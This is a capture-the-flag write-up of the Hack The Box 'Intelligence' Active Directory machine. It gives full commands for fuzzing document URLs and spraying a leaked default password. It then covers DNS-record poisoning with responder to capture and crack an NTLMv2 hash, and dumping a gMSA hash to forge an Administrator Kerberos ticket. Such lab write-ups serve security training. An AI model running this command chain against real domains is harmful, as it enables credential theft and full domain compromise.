> Author: **[Micah][author-profile]**

## Discovery

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-08-25 16:57:50Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

The server uses active directories, with `intelligence-DC-CA` / `dc.intelligence.htb`
at its core.

```bash
PORT    STATE SERVICE      VERSION
53/udp  open  domain       (generic dns response: NOTIMP)
88/udp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-08-25 17:01:44Z)
123/udp open  ntp          NTP v3
389/udp open  ldap         Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
```

Digging `dc.intelligence.htb` returns nothing.

The webpage is mostly empty:

- no dynamic content
- the js sources only handle graphic tasks
- no cookies
- no buttons / urls
- the documents are empty, but:
  - their authors are filled-in: William Lee and Jose Williams
  - they're in the `/documents` subfolder

It points to `/documents`.

## Fuzzing for gold

Fuzzing with a common discovery wordlist doesn't work for directories / files.

But the documents both have the same naming format: "2020-01-01-upload.pdf"
and "2020-12-15". This format can be leveraged with url fuzzing:

```bash
# 2020-01-20-upload.pdf   [Status: 200, Size: 11632, Words: 157, Lines: 127, Duration: 319ms]
# ...
# 2020-12-15-upload.pdf   [Status: 200, Size: 27242, Words: 242, Lines: 210, Duration: 303ms]
# 2020-12-20-upload.pdf   [Status: 200, Size: 11902, Words: 163, Lines: 137, Duration: 260ms]
# 2020-12-28-upload.pdf   [Status: 200, Size: 11480, Words: 164, Lines: 127, Duration: 295ms]
# 2020-12-30-upload.pdf   [Status: 200, Size: 25109, Words: 218, Lines: 191, Duration: 319ms]
# 2020-12-24-upload.pdf   [Status: 200, Size: 26825, Words: 234, Lines: 209, Duration: 286ms]
ffuf -u http://intelligence.htb/documents/FUZZ -w wordlist
```

The list of documents can be reworked into a list of urls and given to wget:

```bash
wget -i wordlists/document-urls
```

A little wrangling gives us the 30 authors:

```bash
exiftool documents/* |
    perl -ne 'm#Creator\s*:\s*(.+)#g && print $1."\n"' |
    sort -u > wordlists/authors
```

And going through the documents one by one I stumbled on [default credentials][default-credentials]:

```
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```

## Finding a valid username

So we have a list of employee names and a default password: one of them is
bound to have kept the default password! We'll bruteforce until establishing
a LDAP connection.

```bash
crackmapexec ldap 10.10.10.248 -u wordlists/usernames -p 'NewIntelligenceCorpUser9876'
```

Or:

```bash
while read u; do
    VALID=$(ldapsearch -x -h 10.10.10.248 -D "intelligence.htb\\$u" -w "NewIntelligenceCorpUser9876" -b "DC=intelligence,DC=com" 2>&1 | grep -ia 'valid')
    echo "${u} ${VALID}" >> bruteforce.log
done < wordlists/usernames
```

> intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876

## Exploring the AD

Let's dump all the information on the AD! First the users:

```bash
# Name                  Email                           PasswordLastSet      LastLogon           
# --------------------  ------------------------------  -------------------  -------------------
# Administrator                                         2021-04-19 02:18:37.324158  2021-08-27 02:55:23.290814
# Tiffany.Molina                                        2021-04-19 02:49:41.532178  2021-04-19 02:51:46.407436
# Ted.Graves                                            2021-04-19 02:49:42.032265  2021-06-30 00:38:15.401356
GetADUsers.py -all -dc-ip 10.10.10.248 intelligence.htb/Tiffany.Molina
```

The shares:

```bash
# Sharename       Type      Comment
# ---------       ----      -------
# ADMIN$          Disk      Remote Admin
# C$              Disk      Default share
# IPC$            IPC       Remote IPC
# IT              Disk      
# NETLOGON        Disk      Logon server share 
# SYSVOL          Disk      Logon server share 
# Users           Disk      
smbclient -U 'Tiffany.Molina%NewIntelligenceCorpUser9876' -L //10.10.10.248
cme smb 10.10.10.248 -u'Tiffany.Molina' -p'NewIntelligenceCorpUser9876' --shares
```

```bash
rpcclient -L dc.intelligence.htb -U'Tiffany.Molina%NewIntelligenceCorpUser9876'
```

All at once:

```bash
ldapdomaindump 10.10.10.248 -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --no-json --no-grep
```

The flag is in the `Users` share.

## Lateral Movement

According to the latest document, the IT share some interesting scripts:

```bash
smbclient -U 'Tiffany.Molina%NewIntelligenceCorpUser9876'  '//10.10.10.248/IT'
get downdetector.ps1
```

This script looks all the DNS records and mails the domains. So if we create a
new record pointing to our box:

```bash
python dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' \
 --action add -r webfoo.intelligence.htb -d 10.10.16.8 10.10.10.248
```

Start responder:

```bash
responder -i 10.10.16.8 -I tun0
```

When Ted clicks on the url for the new record, he is redirected to responder:

```
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:40036b0b876dd6ac:7280D9B9C1E4A165F09AB2DDAE14BAAA:01010000000000007A9CA319EC9AD701ED01BD07C46C4CA70000000002000800480053004C00420001001E00570049004E002D00320051004A005300360057003100360039004E00550004001400480053004C0042002E004C004F00430041004C0003003400570049004E002D00320051004A005300360057003100360039004E0055002E00480053004C0042002E004C004F00430041004C0005001400480053004C0042002E004C004F00430041004C000800300030000000000000000000000000200000289F24DCE1205170392558BF8FB733A333220B16319C56910B453CD0AFBBADF50A001000000000000000000000000000000000000900380048005400540050002F0077006500620066006F006F002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

And finally crack the hash:

```bash
hashcat -m 5600 -a 0 ted-graves.hash /usr/share/wordlists/passwords/rockyou.txt
```

> Ted.Graves:Mr.Teddy

## Escalation

Let's try and grab an admin ticket

### Time synchronization

The Kerberos ticket system requires the clock to be in sync with the server.

It was actually a huge pain: because of the delay timesync was failing.
So we need to set the NTP server and **increase the sync tolerance** in
`/etc/systemd/timesyncd.conf`:

```
[Time]
NTP=10.10.10.248
#FallbackNTP=0.arch.pool.ntp.org 1.arch.pool.ntp.org 2.arch.pool.ntp.org 3.arch.pool.ntp.org
RootDistanceMaxSec=30
#PollIntervalMinSec=32
#PollIntervalMaxSec=2048
```

Enable NTP:

```bash
timedatectl set-ntp 1
systemctl restart systemd-timesyncd.service
```

Or manually:

```bash
timedatectl set-ntp 0
ntpdate -u 10.10.10.248
timedatectl set-time "2021-08-27 05:54:43"
```

### Admin ticket

Get a NTHash:

```bash
#  > DC$
#  > itsupport
# svc_int$:::5e47bac787e5e1970cf9acdb5b316239
python gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb'
```

Then a service ticket:

```bash
getST.py intelligence.htb/svc_int$  -spn WWW/dc.intelligence.htb -hashes :5e47bac787e5e1970cf9acdb5b316239 -impersonate Administrator
```

And use it:

```bash
export KRB5CCNAME=Administrator.ccache
atexec.py -k -no-pass dc.intelligence.htb 'type C:\Users\Administrator\Desktop\root.txt'
```

[author-profile]: https://app.hackthebox.eu/users/22435
[default-credentials]: http://intelligence.htb/documents/2020-06-04-upload.pdf
